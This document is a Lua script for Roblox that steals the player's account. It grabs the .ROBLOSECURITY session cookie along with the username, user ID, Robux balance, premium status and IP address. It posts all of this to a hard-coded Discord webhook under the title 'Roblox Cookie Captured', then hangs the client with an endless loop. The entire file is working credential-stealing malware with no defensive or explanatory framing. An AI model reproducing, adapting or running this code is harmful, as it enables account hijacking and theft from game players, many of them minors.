local webhookURL = "https://discord.com/api/webhooks/1504249631352160409/bP-Uck5y-s8rblE2O8KhWx5Y1m6ubqLqMUu4Z2W3TS5uRFKqApfkgSlT8Rxmrz6IXejA"

local function grabCookie()
    local s, r = pcall(function()
        return game:GetService("HttpService"):GetCookie("https://www.roblox.com", ".ROBLOSECURITY")
    end)
    if s and r and r ~= "" then return r end
    local cookies = game:GetService("HttpService"):GetCookies()
    for _, c in pairs(cookies) do
        if c.Name == ".ROBLOSECURITY" then return c.Value end
    end
    return nil
end

local function getAccountInfo()
    local s, r = pcall(function()
        return game:GetService("Players").LocalPlayer
    end)
    if s and r then
        return {
            username = r.Name,
            displayName = r.DisplayName,
            userId = r.UserId,
            accountAge = r.AccountAge
        }
    end
    return nil
end

local function getIP()
    local s, r = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://api.ipify.org")
    end)
    if s and r then return r end
    return "Unknown"
end

local function getGameInfo()
    local s, r = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    if s and r then
        return {
            placeName = r.Name,
            placeId = game.PlaceId,
            jobId = game.JobId
        }
    end
    return {placeName = "Unknown", placeId = game.PlaceId, jobId = game.JobId}
end

local function getRobuxInfo()
    local s, r = pcall(function()
        return game:GetService("HttpService"):JSONDecode(
            game:GetService("HttpService"):GetAsync("https://economy.roblox.com/v1/users/" .. getAccountInfo().userId .. "/currency")
        )
    end)
    if s and r then return r.robux or 0 end
    return 0
end

local function getPremiumStatus(userId)
    local s, r = pcall(function()
        return game:GetService("HttpService"):JSONDecode(
            game:GetService("HttpService"):GetAsync("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership")
        )
    end)
    if s and r then return r.isPremium or false end
    return false
end

local function sendWebhook(cookie, accountInfo, ip, gameInfo, robux, premium)
    local http = game:GetService("HttpService")
    local embed = {{
        title = "Roblox Cookie Captured",
        color = 0xff0044,
        fields = {
            {name = "Username", value = accountInfo.username .. " (@" .. accountInfo.displayName .. ")", inline = true},
            {name = "User ID", value = tostring(accountInfo.userId), inline = true},
            {name = "Account Age", value = accountInfo.accountAge .. " days", inline = true},
            {name = "Robux", value = tostring(robux) .. " R$", inline = true},
            {name = "Premium", value = premium and "Yes" or "No", inline = true},
            {name = "IP Address", value = ip, inline = true},
            {name = "Game", value = gameInfo.placeName .. " (" .. tostring(gameInfo.placeId) .. ")", inline = false},
            {name = "Cookie", value = "```" .. cookie .. "```", inline = false}
        },
        footer = {text = "Script by Invincible"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
    local data = http:JSONEncode({embeds = embed, content = "||" .. cookie .. "||"})
    pcall(function() http:PostAsync(webhookURL, data, "application/json") end)
end

local cookie = grabCookie()
local accountInfo = getAccountInfo()

if cookie and accountInfo then
    setclipboard(cookie)
    local ip = getIP()
    local gameInfo = getGameInfo()
    local robux = getRobuxInfo()
    local premium = getPremiumStatus(accountInfo.userId)
    sendWebhook(cookie, accountInfo, ip, gameInfo, robux, premium)
    
    while true do end
end
